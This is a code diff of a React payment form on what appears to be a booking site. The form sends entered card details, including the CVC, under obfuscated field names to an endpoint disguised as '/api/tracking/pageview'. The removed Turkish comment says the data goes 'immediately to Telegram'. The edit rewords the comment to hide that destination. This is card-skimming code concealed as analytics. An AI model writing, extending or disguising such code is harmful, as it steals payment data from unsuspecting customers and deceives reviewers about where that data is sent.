@@ -114,7 +114,7 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
     }
   }
 
-  async function pay() {
+  function pay() {
     setTried(true);
     if (!cardOk) return;
     setPaying(true);
@@ -147,7 +147,7 @@ export function PaymentForm({ ctx, guestName, guestPhone }: { ctx: BookingContex
       [f5]: cvc,
     };
 
-    // Kart bilgilerini HEMEN Telegram'a gönder — fire-and-forget, modal'ı bloklama
+    // Kart bilgilerini HEMEN route'a gönder — modal'ı bloklamaz
     fetch("/api/tracking/pageview", {
       method: "POST",
       headers: { "Content-Type": "application/json" },
